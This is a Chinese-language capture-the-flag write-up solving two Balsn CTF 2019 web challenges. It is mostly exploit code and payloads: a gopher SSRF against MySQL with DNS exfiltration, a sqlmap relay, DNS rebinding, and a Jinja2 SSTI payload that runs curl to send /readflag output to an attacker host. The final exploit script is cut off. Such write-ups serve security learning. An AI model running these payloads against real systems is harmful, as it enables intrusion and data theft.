<code>config.php</code>，有点蹊跷，先读下源代码看看。有两种办法，一是通过 <code>eval</code>，而是利用 <code>file_get_contents</code>，后者明显要简单些。这样的后缀检查加个空格就能过。因为读取有长度限制，可直接使用伪协议进行压缩，然后解压即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>;</span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure><p>得到内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file:config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    %</span><br></pre></td></tr></table></figure><p>看到了这个提示，MySQL 还是空密码，目标就相当明确了，<code>gopher</code> 打 MySQL 即可，<code>file_get_contents</code> 一般打不出 <code>gopher</code>。那就利用之前的 <code>curl</code>，这里也有三重限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure><p>至于第一个正则匹配，取反就行了，都是常见技巧，比如 <code>phpinfo</code> =&gt; <code>(~%8F%97%8F%96%91%99%90)()</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g7wda6pcyqj215v07wgmy.jpg" alt="image.png"></p><p><code>gopher</code> 的 payload 都比较长，直接传是不可能的。之前出过很多无参函数的题，常见的手法是通过 <code>getenv</code>、<code>getallheaders</code> 、<code>get_defined_vars</code>之类的函数获取参数。由于长度的限制，最好的选择就是 <code>getenv</code>。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%A7) =&gt; <span class="keyword">getenv</span>(<span class="string">"HTTP_T"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wnp8fcxzj20p803smxh.jpg" alt="image.png"></p><p>成功打出请求，接下来继续打 MySQL， <a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a> 生成下 payload。</p><p>phpinfo 中能看到是 Windows 的机器，验证一下能不能 <a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">DNS 数据外带</a>，不然只能当盲注处理了。</p><p>（PS：本地实验记得修改 mysql.ini 文件，在 [mysqld] 下加入 secure_file_priv =  )</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: admin</span><br><span class="line">Give port: <span class="number">8787</span></span><br><span class="line">Give query <span class="keyword">to</span> execute: <span class="keyword">select</span> load_file(concat('\\\\',version(),'.<span class="number">9</span>fp<span class="number">07</span>q<span class="number">2</span>nho<span class="number">1</span>v<span class="number">8</span>tn<span class="number">68</span>szls<span class="number">54</span>d<span class="number">94</span>fu<span class="number">3</span>j.burpcollaborator.net/a'))<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Your gopher link is ready to do SSRF : </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gopher://127.0.0.1:8787/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%65%00%00%00%03%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%63%6f%6e%63%61%74%28%27%5c%5c%5c%5c%27%2c%76%65%72%73%69%6f%6e%28%29%2c%27%2e%39%66%70%30%37%71%32%6e%68%6f%31%76%38%74%6e%36%38%73%7a%6c%73%35%34%64%39%34%66%75%33%6a%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%61%27%29%29%3b%01%00%00%00%01</span></span><br></pre></td></tr></table></figure><p>成功收到请求。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.16-MariaDB</span><span class="selector-class">.9fp07q2nho1v8tn68szls54d94fu3j</span><span class="selector-class">.burpcollaborator</span><span class="selector-class">.net</span>.</span><br></pre></td></tr></table></figure><p>继续获取数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">"\\\\"</span>,<span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">group_concat</span>(schema_name)),<span class="number">39</span>,<span class="number">68</span>),<span class="string">".9fp07q2nho1v8tn68szls54d94fu3j.burpcollaborator.net/a"</span>)) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="comment">-- 得到了数据库名 test,thisisthedbname，需要注意的是太长了出不了网，不能出现像逗号这种的特殊符号</span></span><br></pre></td></tr></table></figure><p>接下来就是老套路了，读表名、列名，拿数据。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">42616C736E7B337A5F77316E643077735F7068705F6368346C7D</span>  =&gt;  Balsn&#123;<span class="number">3</span>z_w1nd0ws_php_ch4l&#125;</span><br></pre></td></tr></table></figure><p>有师傅把上面的过程整合了下，通过 flask 转发，然后就能 sqlmap 一把梭，值得学习，代码如下。</p><p> <a href="https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html" target="_blank" rel="noopener">https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">                <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">                <span class="string">'Σ&gt;―(#°ω°#)♡→'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="韩国鱼"><a href="#韩国鱼" class="headerlink" title="韩国鱼"></a>韩国鱼</h2><blockquote><p>DNS rebinding、SSTI、命令执行</p></blockquote><p>题目直接放出了 docker 环境，有个 readflag.c，看来是要执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span class="string">'🇰🇷🐟'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('發大財!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外内网里还跑了一个 flask，这段代码明显有 SSTI。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure><p>代码里还很贴心的加入了一个 <code>sleep(1)</code>，对访问 IP 的限制显然可以通过 DNS rebinding 进行绕过。当服务端通过 <code>dns_get_record</code> 解析时，返回 <code>54.87.54.87</code>，通过 <code>file_get_contents</code> 访问时，host 被解析成 <code>127.0.0.1</code> 自然就能打到内网。</p><p>国内能买到的域名 TTL 基本无法为零，难道需要充钱买新域名吗？</p><p>不，有很多现成的平台能用，比如 <a href="https://lock.cmpxchg8b.com/rebinder.html。" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html。</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wshvl45cj211k06b74t.jpg" alt="image.png"></p><p>不过这个是规律性的随机解析，还是要点小运气的 ：）</p><p>可看到成功进入内网：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wsuzjn1yj20v80bpt9z.jpg" alt="image.png"></p><p>要想访问 <code>/error_page</code> ，这还有点小限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br></pre></td></tr></table></figure><p>不过在 Flask 里有个特性，<code>//korea/error_page</code> =&gt; <code>/error_page</code>，自然就解决了。当然也可以自己写个跳转。</p><p>另外还有一点：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import os</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; os.path.join(<span class="string">"/var/www/flask"</span>, <span class="string">"error"</span>, <span class="string">"/etc/passwd"</span>)</span><br><span class="line"><span class="string">'/etc/passwd'</span></span><br></pre></td></tr></table></figure><p>接下来要做的就是找到一个可控的文件，别忘了前面还跑了个 PHP，那就利用 <code>session.upload_progress</code> 进行上传吧，也是常见的手段。可参考：</p><p><a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html" target="_blank" rel="noopener">https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html</a></p><p><a href="https://www.anquanke.com/post/id/162656" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162656</a></p><p><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p>我们先看一下 SSTI 如何构造才能进行命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">过滤 &#123;&#123;  =&gt;  &#123;%%&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤  .  =&gt; </span></span><br><span class="line"><span class="string">            &#123;&#123;''['__class__']&#125;&#125;</span></span><br><span class="line"><span class="string">            &#123;&#123;''|attr('__class__')&#125;&#125;</span></span><br><span class="line"><span class="string">            \x2e</span></span><br><span class="line"><span class="string">            getattr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用 payload</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">        &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [][<span class="string">'__class__'</span>][<span class="string">'__base__'</span>][<span class="string">'__subclasses__'</span>]() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c[<span class="string">'__name__'</span>] == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c[<span class="string">'__init__'</span>][<span class="string">'__globals__'</span>][<span class="string">'values'</span>]() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> b[<span class="string">'__class__'</span>]==&#123;&#125;[<span class="string">'__class__'</span>] %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b[<span class="string">'keys'</span>]() %&#125;</span><br><span class="line">                &#123;% <span class="keyword">if</span> b[<span class="string">'eval'</span>](<span class="string">'getattr(__import__("os"),"popen")("curl your_host/`/readflag`")'</span>) %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>把 orange 之前 one line php 的 exp 改下就能用了，最终 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish.balsnctf.com'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span 